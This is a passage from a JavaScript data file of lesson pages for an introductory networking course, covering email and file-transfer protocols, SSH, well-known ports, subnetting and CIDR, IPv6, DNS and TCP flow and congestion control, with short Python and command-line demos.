        `
      },
      {
        // Page 1: Demo Python SMTP
        titleEn: "Demo — Sending Email with Python",
        contentEn: `
          <p>Python can send email using the built-in <code>smtplib</code> module:</p>
<pre><code>import smtplib
from email.mime.text import MIMEText

# Create the message
msg = MIMEText("Hello! This is a test email.")
msg["Subject"] = "Test Email"
msg["From"] = "sender@example.com"
msg["To"] = "recipient@example.com"

# Connect to SMTP server and send
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()  # Upgrade to encrypted connection
    server.login("sender@example.com", "app_password")
    server.send_message(msg)
    print("Email sent!")
</code></pre>
          <p><strong>Important notes:</strong></p>
          <ul>
            <li><code>starttls()</code> — upgrades the connection to TLS encryption</li>
            <li>Gmail requires an <strong>App Password</strong> (not your regular password)</li>
            <li><code>MIMEText</code> creates a properly formatted email message</li>
          </ul>
        `
      },
      {
        // Page 2: FTP
        titleEn: "FTP — File Transfer Protocol",
        contentEn: `
          <p><strong>FTP</strong> transfers files between computers. It uses <strong>two connections</strong>:</p>
          <ul>
            <li><strong>Control connection</strong> (port 21) — sends commands (LIST, GET, PUT)</li>
            <li><strong>Data connection</strong> (port 20 or random) — transfers the actual file data</li>
          </ul>
          <p><strong>Active mode:</strong></p>
          <ul>
            <li>The client tells the server "connect to me on port X"</li>
            <li>The server opens a connection back to the client</li>
            <li>Problem: firewalls often block incoming connections</li>
          </ul>
          <p><strong>Passive mode:</strong></p>
          <ul>
            <li>The client asks the server "give me a port to connect to"</li>
            <li>The client opens the data connection to the server</li>
            <li>Works better with firewalls — most FTP clients use this</li>
          </ul>
          <p><strong>SFTP</strong> (SSH File Transfer Protocol) is the secure alternative — runs over SSH, encrypted.</p>
        `
      },
      {
        // Page 3: SSH
        titleEn: "SSH — Secure Shell (Port 22)",
        contentEn: `
          <p><strong>SSH</strong> gives you a secure, encrypted connection to a remote computer.</p>
          <ul>
            <li>Default port: <strong>22</strong></li>
            <li>Replaces Telnet (which was not encrypted)</li>
            <li>Used to manage servers, run commands remotely</li>
          </ul>
          <p><strong>Authentication methods:</strong></p>
          <ul>
            <li><strong>Password</strong> — simple but less secure</li>
            <li><strong>SSH keys</strong> — public/private key pair, much more secure</li>
          </ul>
          <p><strong>Common uses:</strong></p>
          <ul>
            <li><code>ssh user@server.com</code> — connect to a remote server</li>
            <li><code>scp file.txt user@server:/path/</code> — copy a file securely</li>
            <li><strong>SSH tunnel</strong> — forward a local port through an encrypted connection</li>
          </ul>
          <p><strong>SSH key setup:</strong></p>
<pre><code>ssh-keygen -t ed25519         # Generate a key pair
ssh-copy-id user@server.com   # Copy public key to server
ssh user@server.com           # Login without password
</code></pre>
        `
      },
      {
        // Page 4: Well-known ports
        titleEn: "Well-Known Ports",
        contentEn: `
          <p>Each service has a default port number. Here are the most important ones:</p>
          <table>
            <thead><tr><th>Port</th><th>Protocol</th><th>Description</th></tr></thead>
            <tbody>
              <tr><td>20-21</td><td>FTP</td><td>File Transfer (data + control)</td></tr>
              <tr><td>22</td><td>SSH</td><td>Secure Shell — encrypted remote access</td></tr>
              <tr><td>23</td><td>Telnet</td><td>Remote access — NOT encrypted (avoid!)</td></tr>
              <tr><td>25</td><td>SMTP</td><td>Sending email (server-to-server)</td></tr>
              <tr><td>53</td><td>DNS</td><td>Domain name resolution</td></tr>
              <tr><td>67-68</td><td>DHCP</td><td>Automatic IP address assignment</td></tr>
              <tr><td>80</td><td>HTTP</td><td>Web — not encrypted</td></tr>
              <tr><td>443</td><td>HTTPS</td><td>Web — encrypted with TLS</td></tr>
              <tr><td>587</td><td>SMTP</td><td>Sending email (client, with TLS)</td></tr>
              <tr><td>993</td><td>IMAP</td><td>Reading email (with TLS)</td></tr>
              <tr><td>995</td><td>POP3</td><td>Downloading email (with TLS)</td></tr>
              <tr><td>3306</td><td>MySQL</td><td>MySQL database</td></tr>
              <tr><td>3389</td><td>RDP</td><td>Remote Desktop (Windows)</td></tr>
            </tbody>
          </table>
          <p>Ports 0–1023 are <strong>well-known ports</strong> (reserved for standard services).</p>
        `
      },
      {
        // Page 5: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>SMTP</strong> sends email (port 587), <strong>IMAP</strong> reads email (port 993), <strong>POP3</strong> downloads email (port 995)</li>
            <li>Python's <code>smtplib</code> can send email programmatically</li>
            <li><strong>FTP</strong> uses two connections — control (port 21) and data (port 20)</li>
            <li>FTP has <strong>active</strong> and <strong>passive</strong> modes — passive works better with firewalls</li>
            <li><strong>SSH</strong> (port 22) provides encrypted remote access — replaced Telnet</li>
            <li>SSH keys are more secure than passwords</li>
            <li>Ports 0–1023 are <strong>well-known ports</strong> for standard services</li>
          </ul>
        `
      },
      {
        // Page 6: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 17 ==========
  17: {
    titleEn: "Subnetting and CIDR — Network Division",
    pages: [
      {
        // Page 0: What is subnetting
        titleEn: "What Is Subnetting?",
        contentEn: `
          <p><strong>Subnetting</strong> means dividing a large network into smaller networks.</p>
          <p><strong>Why do we need it?</strong></p>
          <ul>
            <li><strong>Organization</strong> — separate departments, floors, or buildings</li>
            <li><strong>Security</strong> — isolate sensitive networks</li>
            <li><strong>Performance</strong> — reduce broadcast traffic</li>
          </ul>
          <p>An IP address has two parts:</p>
          <ul>
            <li><strong>Network part</strong> — identifies which network</li>
            <li><strong>Host part</strong> — identifies which device on that network</li>
          </ul>
          <p>The <strong>subnet mask</strong> tells us where to split:</p>
          <ul>
            <li><code>255.255.255.0</code> — first 24 bits = network, last 8 bits = host</li>
            <li>This gives us 254 usable host addresses (256 − 2)</li>
          </ul>
        `
      },
      {
        // Page 1: CIDR notation
        titleEn: "CIDR Notation",
        contentEn: `
          <p><strong>CIDR</strong> (Classless Inter-Domain Routing) is a short way to write the subnet mask.</p>
          <p>Instead of <code>255.255.255.0</code>, we write <code>/24</code>.</p>
          <p>The number after the slash = how many bits are the <strong>network part</strong>.</p>
          <table>
            <thead><tr><th>CIDR</th><th>Subnet Mask</th><th>Hosts</th><th>Use Case</th></tr></thead>
            <tbody>
              <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>Very large network</td></tr>
              <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Large organization</td></tr>
              <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Typical LAN</td></tr>
              <tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Small subnet</td></tr>
              <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Point-to-point link</td></tr>
              <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>Single host</td></tr>
            </tbody>
          </table>
          <p><strong>Example:</strong> <code>192.168.1.0/24</code> means network 192.168.1.x with 254 usable hosts.</p>
        `
      },
      {
        // Page 2: Private vs Public IPs
        titleEn: "Private vs Public IP Addresses",
        contentEn: `
          <p>Not all IP addresses are visible on the Internet.</p>
          <p><strong>Private IPs</strong> — used inside local networks (not routed on the Internet):</p>
          <table>
            <thead><tr><th>Range</th><th>CIDR</th><th>Common Use</th></tr></thead>
            <tbody>
              <tr><td>10.0.0.0 – 10.255.255.255</td><td>10.0.0.0/8</td><td>Large companies</td></tr>
              <tr><td>172.16.0.0 – 172.31.255.255</td><td>172.16.0.0/12</td><td>Medium networks</td></tr>
              <tr><td>192.168.0.0 – 192.168.255.255</td><td>192.168.0.0/16</td><td>Home networks</td></tr>
            </tbody>
          </table>
          <p><strong>Public IPs</strong> — unique addresses on the Internet.</p>
          <ul>
            <li>Assigned by your ISP</li>
            <li>Every website has a public IP</li>
          </ul>
          <p><strong>NAT</strong> (Network Address Translation) lets many private IPs share one public IP. Your home router does this — all your devices use private IPs, but the router translates them to one public IP.</p>
        `
      },
      {
        // Page 3: Subnetting calculation
        titleEn: "Subnetting Calculation Example",
        contentEn: `
          <p><strong>Problem:</strong> You have the network <code>192.168.10.0/24</code>. Divide it into 4 subnets.</p>
          <p><strong>Step 1:</strong> How many bits do we need to borrow?</p>
          <ul>
            <li>4 subnets → 2 bits (2² = 4)</li>
            <li>New mask: /24 + 2 = <strong>/26</strong></li>
            <li>Subnet mask: 255.255.255.192</li>
          </ul>
          <p><strong>Step 2:</strong> Calculate the subnets.</p>
          <ul>
            <li>Each subnet has 2⁶ = 64 addresses (62 usable)</li>
          </ul>
          <table>
            <thead><tr><th>Subnet</th><th>Range</th><th>Broadcast</th><th>Usable Hosts</th></tr></thead>
            <tbody>
              <tr><td>192.168.10.0/26</td><td>.1 – .62</td><td>.63</td><td>62</td></tr>
              <tr><td>192.168.10.64/26</td><td>.65 – .126</td><td>.127</td><td>62</td></tr>
              <tr><td>192.168.10.128/26</td><td>.129 – .190</td><td>.191</td><td>62</td></tr>
              <tr><td>192.168.10.192/26</td><td>.193 – .254</td><td>.255</td><td>62</td></tr>
            </tbody>
          </table>
          <p><strong>Remember:</strong> First address = network address, last address = broadcast. Both are not usable.</p>
        `
      },
      {
        // Page 4: Demo Python ipaddress
        titleEn: "Demo — Python ipaddress Module",
        contentEn: `
          <p>Python has a built-in module for working with IP addresses and subnets:</p>
<pre><code>import ipaddress

# Create a network
net = ipaddress.ip_network("192.168.10.0/24")
print(net.network_address)   # 192.168.10.0
print(net.broadcast_address) # 192.168.10.255
print(net.num_addresses)     # 256
print(net.netmask)           # 255.255.255.0

# List all usable hosts
for host in net.hosts():
    print(host)  # 192.168.10.1 ... 192.168.10.254

# Divide into 4 subnets
subnets = list(net.subnets(prefixlen_diff=2))
for s in subnets:
    print(f"{s} → {s.num_addresses} addresses")
# 192.168.10.0/26   → 64 addresses
# 192.168.10.64/26  → 64 addresses
# 192.168.10.128/26 → 64 addresses
# 192.168.10.192/26 → 64 addresses

# Check if an IP is in a network
ip = ipaddress.ip_address("192.168.10.50")
print(ip in net)  # True
</code></pre>
        `
      },
      {
        // Page 5: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 6: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>Subnetting</strong> divides a large network into smaller, isolated networks</li>
            <li><strong>CIDR notation</strong> (/24, /26, etc.) shows how many bits are the network part</li>
            <li><strong>Private IPs</strong> (10.x, 172.16-31.x, 192.168.x) are used inside local networks</li>
            <li><strong>NAT</strong> lets many private IPs share one public IP</li>
            <li>To subnet: borrow bits from the host part → more subnets, fewer hosts each</li>
            <li>First address = network, last address = broadcast (both not usable)</li>
            <li>Python's <code>ipaddress</code> module makes subnet calculations easy</li>
          </ul>
        `
      },
      {
        // Page 7: simulation — SKIP
        titleEn: "Simulation",
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },
  18: {
    titleEn: "IPv6 — The New Internet Address",
    pages: [
      {
        titleEn: "Why Do We Need IPv6?",
        contentEn: `<p>IPv4 gives us about 4.3 billion addresses. That sounds like a lot, but:</p>
<ul>
<li>The world has 8 billion people</li>
<li>Each person may have a phone, laptop, tablet, smart watch</li>
<li>IoT devices (cameras, sensors, fridges) need addresses too</li>
</ul>
<p>We ran out of IPv4 addresses in 2011. Since then, we use workarounds like NAT. But NAT has problems:</p>
<ul>
<li>Breaks direct device-to-device connections</li>
<li>Makes peer-to-peer apps harder</li>
<li>Adds complexity to every network</li>
</ul>
<p><strong>IPv6 solves this.</strong> It provides 340 undecillion addresses (3.4 x 10^38). That is enough to give every grain of sand on Earth its own address — billions of times over.</p>`
      },
      {
        titleEn: "IPv6 Address Format",
        contentEn: `<p>An IPv6 address is <strong>128 bits</strong> long (IPv4 is only 32 bits).</p>
<p>It is written as <strong>8 groups of 4 hex digits</strong>, separated by colons:</p>
<pre>2001:0db8:85a3:0000:0000:8a2e:0370:7334</pre>
<p><strong>Shortening rules:</strong></p>
<ul>
<li>Drop leading zeros in each group: <code>0db8</code> becomes <code>db8</code></li>
<li>Replace one sequence of all-zero groups with <code>::</code> (only once)</li>
</ul>
<p>Example:</p>
<pre>2001:0db8:0000:0000:0000:0000:0000:0001
2001:db8::1</pre>
<p>Both are the same address. The <code>::</code> replaces six groups of zeros.</p>
<p><strong>Key difference from IPv4:</strong></p>
<ul>
<li>IPv4: <code>192.168.1.1</code> (decimal, dots)</li>
<li>IPv6: <code>2001:db8::1</code> (hex, colons)</li>
</ul>`
      },
      {
        titleEn: "IPv6 Address Types",
        contentEn: `<p>IPv6 has several address types:</p>
<h3>Global Unicast</h3>
<ul>
<li>Start with <code>2000::/3</code> (addresses beginning with 2 or 3)</li>
<li>Like a public IPv4 address — routable on the internet</li>
<li>Every device can have its own global address. No NAT needed!</li>
</ul>
<h3>Link-Local</h3>
<ul>
<li>Start with <code>fe80::/10</code></li>
<li>Work only on the local network segment</li>
<li>Every IPv6 device creates one automatically</li>
<li>Used for neighbor discovery and local communication</li>
</ul>
<h3>Loopback</h3>
<ul>
<li><code>::1</code> — the device talks to itself</li>
<li>Same idea as <code>127.0.0.1</code> in IPv4</li>
</ul>
<h3>Multicast</h3>
<ul>
<li>Start with <code>ff00::/8</code></li>
<li>Send one packet to a group of devices</li>
<li>IPv6 has no broadcast. Multicast replaces it</li>
<li>Example: <code>ff02::1</code> = all nodes on the link</li>
</ul>`
      },
      {
        titleEn: "IPv6 Header — Simple and Fixed",
        contentEn: `<p>The IPv6 header is <strong>40 bytes</strong>, always fixed size. The IPv4 header is 20-60 bytes (variable).</p>
<p><strong>IPv6 header fields:</strong></p>
<ul>
<li><strong>Version</strong> (4 bits): always 6</li>
<li><strong>Traffic Class</strong> (8 bits): priority of the packet (like QoS)</li>
<li><strong>Flow Label</strong> (20 bits): identifies a flow of packets (new in IPv6)</li>
<li><strong>Payload Length</strong> (16 bits): size of the data after the header</li>
<li><strong>Next Header</strong> (8 bits): what comes after this header (TCP, UDP, or extension header)</li>
<li><strong>Hop Limit</strong> (8 bits): same as TTL in IPv4 — decreases by 1 at each router</li>
<li><strong>Source Address</strong> (128 bits): sender</li>
<li><strong>Destination Address</strong> (128 bits): receiver</li>
</ul>
<p><strong>What IPv6 removed:</strong></p>
<ul>
<li>No header checksum — layers above (TCP/UDP) handle error checking</li>
<li>No fragmentation fields — only the sender can fragment in IPv6</li>
</ul>
<p>Fixed size = routers process packets faster.</p>`
      },
      {
        titleEn: "NDP — Neighbor Discovery Protocol",
        contentEn: `<p>IPv4 uses ARP to find MAC addresses. IPv6 replaces ARP with <strong>NDP</strong> (Neighbor Discovery Protocol).</p>
<p><strong>NDP does several things:</strong></p>
<ul>
<li><strong>Address resolution:</strong> "Who has this IPv6 address? Tell me your MAC." (Like ARP)</li>
<li><strong>Router discovery:</strong> devices find routers on the network automatically</li>
<li><strong>Auto-configuration (SLAAC):</strong> devices create their own IPv6 address without DHCP</li>
<li><strong>Duplicate address detection:</strong> checks if an address is already in use</li>
</ul>
<p><strong>How address resolution works:</strong></p>
<ol>
<li>Device A sends a <strong>Neighbor Solicitation</strong> (NS) to a multicast address</li>
<li>Device B replies with a <strong>Neighbor Advertisement</strong> (NA) containing its MAC</li>
</ol>
<p><strong>SLAAC (Stateless Auto-Configuration):</strong></p>
<ol>
<li>Router sends a Router Advertisement (RA) with the network prefix</li>
<li>Device takes the prefix + generates a host part from its MAC address</li>
<li>Device now has a full IPv6 address — no DHCP server needed</li>
</ol>`
      },
      {
        titleEn: "Transition: IPv4 to IPv6",
        contentEn: `<p>We cannot switch the whole internet to IPv6 overnight. Both protocols must work together during the transition.</p>
<h3>Dual Stack</h3>
<ul>
<li>Devices run both IPv4 and IPv6 at the same time</li>
<li>If the destination supports IPv6, use IPv6. Otherwise, use IPv4</li>
<li>Most modern operating systems support dual stack</li>
<li>This is the most common approach today</li>
</ul>
<h3>Tunneling (6in4, 6to4)</h3>
<ul>
<li>Wrap IPv6 packets inside IPv4 packets</li>
<li>IPv6 traffic travels through IPv4 networks</li>
<li>Like putting a letter inside another envelope</li>
<li>Used when the path between two IPv6 networks is IPv4-only</li>
</ul>
<h3>NAT64 / DNS64</h3>
<ul>
<li>Translates between IPv6 and IPv4</li>
<li>IPv6-only devices can reach IPv4-only servers</li>
<li>Used by mobile carriers (T-Mobile, for example)</li>
</ul>
<p><strong>Current status:</strong> About 40% of Google traffic is IPv6 (2024). Full transition will take many more years.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>IPv4 has only 4.3 billion addresses — not enough for today's world</li>
<li>IPv6 uses 128-bit addresses (8 groups of hex), providing practically unlimited addresses</li>
<li>Address types: global unicast (public), link-local (local only), loopback (::1), multicast</li>
<li>IPv6 header is fixed 40 bytes — simpler and faster than IPv4</li>
<li>NDP replaces ARP, and adds auto-configuration (SLAAC) — no DHCP needed</li>
<li>Transition uses dual stack (both protocols), tunneling, or NAT64 translation</li>
<li>About 40% of internet traffic is already IPv6</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  19: {
    titleEn: "DNS in Depth",
    pages: [
      {
        titleEn: "The DNS Hierarchy",
        contentEn: `<p>DNS is like a phone book for the internet. It turns names (google.com) into IP addresses (142.250.80.46).</p>
<p>DNS is organized as a <strong>tree</strong> with three levels:</p>
<h3>Root Servers</h3>
<ul>
<li>13 root server groups (A through M), run by different organizations</li>
<li>They do not know every domain. They know where to find TLD servers</li>
<li>There are actually hundreds of copies worldwide (anycast)</li>
</ul>
<h3>TLD Servers (Top-Level Domain)</h3>
<ul>
<li>Handle <code>.com</code>, <code>.org</code>, <code>.net</code>, <code>.il</code>, etc.</li>
<li>Verisign runs <code>.com</code> — the biggest TLD</li>
<li>They know which authoritative server handles each domain</li>
</ul>
<h3>Authoritative Servers</h3>
<ul>
<li>The final answer. They hold the actual DNS records for a domain</li>
<li>Example: Cloudflare's servers are authoritative for millions of domains</li>
<li>The domain owner controls what records are stored here</li>
</ul>`
      },
      {
        titleEn: "Recursive Resolution — Step by Step",
        contentEn: `<p>When you type <code>www.example.com</code> in your browser, here is what happens:</p>
<ol>
<li><strong>Browser cache:</strong> Did I look this up recently? If yes, use the cached answer</li>
<li><strong>OS cache:</strong> The operating system checks its own DNS cache</li>
<li><strong>Recursive resolver:</strong> Your ISP's DNS server (or 8.8.8.8, 1.1.1.1) takes over</li>
<li><strong>Root server:</strong> Resolver asks a root server: "Where is .com?" Root answers with TLD server address</li>
<li><strong>TLD server:</strong> Resolver asks the .com TLD: "Where is example.com?" TLD answers with the authoritative server</li>
<li><strong>Authoritative server:</strong> Resolver asks: "What is the IP of www.example.com?" Gets the final answer</li>
<li><strong>Response:</strong> Resolver sends the IP back to your computer. Browser connects</li>
</ol>
<p>This full process takes about <strong>50-200 ms</strong> the first time. After that, the answer is cached and takes less than 1 ms.</p>
<p>The recursive resolver does all the hard work. Your device only sends one query and gets one answer.</p>`
      },
      {
        titleEn: "DNS Record Types",
        contentEn: `<p>A domain can have many types of records:</p>
<ul>
<li><strong>A</strong> — Maps a name to an IPv4 address. <code>example.com → 93.184.216.34</code></li>
<li><strong>AAAA</strong> — Maps a name to an IPv6 address. <code>example.com → 2606:2800:220:1:...</code></li>
<li><strong>CNAME</strong> — Alias. Points one name to another. <code>www.example.com → example.com</code></li>
<li><strong>MX</strong> — Mail server. Tells email where to go. <code>example.com → mail.example.com (priority 10)</code></li>
<li><strong>NS</strong> — Name server. Which DNS server is authoritative for this domain</li>
<li><strong>TXT</strong> — Text data. Used for email security (SPF, DKIM, DMARC) and domain verification</li>
<li><strong>SOA</strong> — Start of Authority. Contains the primary name server, admin email, serial number, and timing values</li>
<li><strong>PTR</strong> — Reverse lookup. Maps an IP address back to a name. Used for email verification</li>
</ul>
<p><strong>A single domain often has many records.</strong> For example, google.com has A, AAAA, MX, NS, TXT, and SOA records.</p>`
      },
      {
        titleEn: "Demo: The dig Command",
        type: "simulation",
        contentEn: `<p>The <code>dig</code> command lets you query DNS servers directly from the terminal.</p>
<h3>Basic query:</h3>
<pre>$ dig example.com

;; ANSWER SECTION:
example.com.    3600    IN    A    93.184.216.34</pre>
<p>This shows: the name, TTL (3600 seconds = 1 hour), record class (IN = Internet), type (A), and the IP address.</p>
<h3>Query a specific record type:</h3>
<pre>$ dig example.com MX

;; ANSWER SECTION:
example.com.    3600    IN    MX    10 mail.example.com.</pre>
<h3>Trace the full resolution path:</h3>
<pre>$ dig +trace example.com</pre>
<p>This shows every step: root → TLD → authoritative. Very useful for debugging DNS problems.</p>
<h3>Query a specific DNS server:</h3>
<pre>$ dig @8.8.8.8 example.com</pre>
<p>This asks Google's DNS server directly instead of your default resolver.</p>`
      },
      {
        titleEn: "DNS Caching and TTL",
        contentEn: `<p>Without caching, every website visit would need 4+ DNS queries. That would be slow and overload DNS servers.</p>
<h3>TTL (Time to Live)</h3>
<ul>
<li>Every DNS record has a TTL value in seconds</li>
<li>TTL = how long the answer can be cached</li>
<li>After TTL expires, the resolver must ask again</li>
</ul>
<p><strong>Common TTL values:</strong></p>
<ul>
<li><strong>300 (5 minutes):</strong> Common for websites that change servers often (CDN, failover)</li>
<li><strong>3600 (1 hour):</strong> Standard for most websites</li>
<li><strong>86400 (24 hours):</strong> Stable records that rarely change</li>
</ul>
<h3>Where caching happens:</h3>
<ul>
<li><strong>Browser:</strong> Keeps its own DNS cache (Chrome: <code>chrome://net-internals/#dns</code>)</li>
<li><strong>Operating system:</strong> System-level DNS cache</li>
<li><strong>Recursive resolver:</strong> ISP or public resolver caches for all users</li>
</ul>
<p><strong>Tradeoff:</strong> Long TTL = faster but slow to update. Short TTL = always fresh but more DNS traffic.</p>`
      },
      {
        titleEn: "Encrypted DNS: DoH and DoT",
        contentEn: `<p>Traditional DNS sends queries in <strong>plain text</strong>. Anyone on the network can see which websites you visit.</p>
<h3>DNS over HTTPS (DoH)</h3>
<ul>
<li>DNS queries travel inside HTTPS (port 443)</li>
<li>Looks like normal web traffic — hard to block</li>
<li>Used by Firefox, Chrome, Edge by default</li>
<li>Providers: Cloudflare (1.1.1.1), Google (8.8.8.8)</li>
</ul>
<h3>DNS over TLS (DoT)</h3>
<ul>
<li>DNS queries are encrypted with TLS (port 853)</li>
<li>Dedicated port makes it easy to identify (and block)</li>
<li>Used more by Android and network-level setups</li>
</ul>
<h3>Why does this matter?</h3>
<ul>
<li>Your ISP cannot see which sites you look up (with DoH/DoT)</li>
<li>Public Wi-Fi attackers cannot spy on your DNS</li>
<li>Prevents DNS hijacking by middlemen</li>
</ul>
<p><strong>Note:</strong> Encrypted DNS hides your queries from the network, but the DNS provider (Cloudflare, Google) still sees them.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>DNS is a hierarchy: root servers → TLD servers → authoritative servers</li>
<li>Recursive resolvers do the work: they walk the tree and cache the answers</li>
<li>Key record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), NS (name server), TXT, SOA, PTR</li>
<li>The <code>dig</code> command lets you query DNS and trace resolution paths</li>
<li>TTL controls how long answers are cached — balances speed vs freshness</li>
<li>DoH (HTTPS, port 443) and DoT (TLS, port 853) encrypt DNS to protect privacy</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  20: {
    titleEn: "TCP in Depth",
    pages: [
      {
        titleEn: "What Problems Does TCP Solve?",
        contentEn: `<p>The internet is unreliable. Packets can be lost, arrive out of order, or flood a slow receiver. TCP solves three main problems:</p>
<h3>1. Packet Loss</h3>
<ul>
<li>Routers drop packets when they are overloaded</li>
<li>Wireless links lose packets to interference</li>
<li>TCP detects lost packets and retransmits them</li>
</ul>
<h3>2. Flow Control</h3>
<ul>
<li>A fast sender can overwhelm a slow receiver</li>
<li>The receiver tells the sender: "I have room for X bytes"</li>
<li>The sender never sends more than the receiver can handle</li>
</ul>
<h3>3. Congestion Control</h3>
<ul>
<li>Too many senders can flood the network</li>
<li>TCP detects congestion (packet loss, delay) and slows down</li>
<li>All TCP connections share the network fairly</li>
</ul>
<p>TCP uses <strong>sequence numbers</strong> and <strong>acknowledgments</strong> (ACKs) to track every byte. If an ACK does not arrive in time, TCP assumes the packet was lost and sends it again.</p>`
      },
      {
        titleEn: "Sliding Window and Flow Control",
        contentEn: `<p>TCP uses a <strong>sliding window</strong> to control how much data is sent before waiting for an ACK.</p>
<h3>Receive Window (rwnd)</h3>
<ul>
<li>The receiver advertises how much buffer space it has</li>
<li>This value is sent in every ACK packet</li>
<li>The sender will not send more than <code>rwnd</code> bytes without an ACK</li>
</ul>
<h3>How it works:</h3>
<ol>
<li>Receiver says: "My window is 16 KB" (I can accept 16 KB of data)</li>
<li>Sender sends 16 KB of data in multiple packets</li>
<li>Receiver processes some data, frees buffer space</li>
<li>Receiver ACKs: "Got everything up to byte 16000, window is now 8 KB"</li>
<li>Sender can send 8 KB more</li>
</ol>
<p><strong>Window = 0:</strong> The receiver is full. The sender must stop and wait. It sends small "probe" packets to check when space opens up.</p>
<p>The window slides forward as data is acknowledged. That is why it is called a "sliding window."</p>`
      },
      {
        titleEn: "Congestion Control — Slow Start",
        contentEn: `<p>Flow control protects the receiver. <strong>Congestion control</strong> protects the network.</p>
<h3>Congestion Window (cwnd)</h3>
<ul>
<li>The sender keeps its own limit: the congestion window</li>
<li>The actual sending rate = minimum of rwnd and cwnd</li>
<li>cwnd starts small and grows as the connection succeeds</li>
</ul>
<h3>Slow Start</h3>
<ol>
<li>Connection begins with <code>cwnd = 1 MSS</code> (one packet, about 1460 bytes)</li>
<li>For every ACK received, cwnd increases by 1 MSS</li>
<li>This means cwnd <strong>doubles</strong> every round-trip time (RTT)</li>
<li>1 → 2 → 4 → 8 → 16 → 32 packets... exponential growth</li>
</ol>
<p><strong>When does slow start stop?</strong></p>
<ul>
<li>When cwnd reaches <code>ssthresh</code> (slow start threshold) → switch to congestion avoidance</li>
<li>When a packet is lost → congestion detected, cut cwnd</li>
</ul>
<p>The name "slow start" is misleading. It grows exponentially — it is actually quite fast. But it starts from 1, not from the maximum.</p>`
      },
      {
        titleEn: "Congestion Avoidance — AIMD",
        contentEn: `<p>After slow start reaches <code>ssthresh</code>, TCP switches to <strong>congestion avoidance</strong>.</p>
<h3>AIMD: Additive Increase, Multiplicative Decrease</h3>
<ul>
<li><strong>Additive Increase:</strong> cwnd grows by 1 MSS per RTT (linear, not exponential)</li>
<li><strong>Multiplicative Decrease:</strong> On packet loss, cwnd is cut in half</li>
</ul>
<h3>Why AIMD works:</h3>
<ul>
<li>Slow increase probes for available bandwidth carefully</li>
<li>Fast decrease reacts quickly to congestion</li>
<li>The "sawtooth" pattern: cwnd grows slowly, drops fast, grows again</li>
<li>Over time, all connections converge to a fair share of bandwidth</li>
</ul>
<h3>Two types of loss detection:</h3>
<ul>
<li><strong>Triple duplicate ACK:</strong> Mild congestion. cwnd = cwnd / 2 (fast recovery)</li>
<li><strong>Timeout:</strong> Severe congestion. cwnd = 1 MSS, start over from slow start</li>
</ul>
<p>Triple duplicate ACK means some packets still get through. Timeout means nothing is getting through — the situation is worse.</p>`
      },
      {
        titleEn: "RTT and Timeout Calculation",
        contentEn: `<p>TCP needs to know when a packet is "lost." It uses a <strong>timeout</strong> (RTO). If no ACK arrives within RTO, retransmit.</p>
<h3>RTT (Round Trip Time)</h3>
<ul>
<li>Time from sending a packet to receiving its ACK</li>
<li>RTT changes constantly — network conditions vary</li>
<li>TCP measures RTT for each acknowledged packet</li>
</ul>
<h3>Calculating RTO:</h3>
<ul>
<li><strong>SRTT</strong> (Smoothed RTT): weighted average of recent RTT measurements</li>
<li><strong>RTTVAR</strong>: how much RTT varies (the jitter)</li>
<li><strong>RTO = SRTT + 4 x RTTVAR</strong></li>
</ul>
<p>Example:</p>
<ul>
<li>SRTT = 100 ms, RTTVAR = 20 ms</li>
<li>RTO = 100 + 4 x 20 = <strong>180 ms</strong></li>
</ul>
<h3>Important rules:</h3>
<ul>
<li>Minimum RTO is usually 200 ms (even if RTT is 1 ms)</li>
<li>If a timeout happens, RTO doubles (exponential backoff): 200 → 400 → 800 ms</li>
<li>This prevents a flood of retransmissions during congestion</li>
</ul>`
      },
      {
        titleEn: "Modern Congestion Algorithms",
        contentEn: `<p>The original TCP algorithm (Tahoe/Reno) was designed in 1988. Modern networks need better algorithms.</p>
<h3>TCP Reno (1990)</h3>
<ul>
<li>Added "fast recovery" — do not go back to slow start on triple duplicate ACK</li>
<li>Cut cwnd in half and continue from there</li>
<li>Still the baseline that others are compared to</li>
</ul>
<h3>TCP CUBIC (2006)</h3>
<ul>
<li>Default in Linux since 2006</li>
<li>Uses a cubic function to grow cwnd, not linear</li>
<li>Grows fast when far from the last loss point, slows down near it</li>
<li>Better for high-bandwidth, high-latency links (long fat pipes)</li>
</ul>
<h3>BBR — Bottleneck Bandwidth and RTT (Google, 2016)</h3>
<ul>
<li>Does not use packet loss as a congestion signal</li>
<li>Instead, it measures the actual bottleneck bandwidth and minimum RTT</li>
<li>Tries to send at exactly the right rate — not too fast, not too slow</li>
<li>Used by Google, YouTube, and many CDNs</li>
<li>Works much better on lossy networks (wireless, long distance)</li>
</ul>
<p>BBR is a big shift in thinking. Traditional TCP: "loss = congestion." BBR: "let me measure the real capacity."</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>TCP solves three problems: packet loss (retransmission), flow control (receiver protection), congestion control (network protection)</li>
<li>The receive window (rwnd) is a sliding window — the receiver advertises how much data it can accept</li>
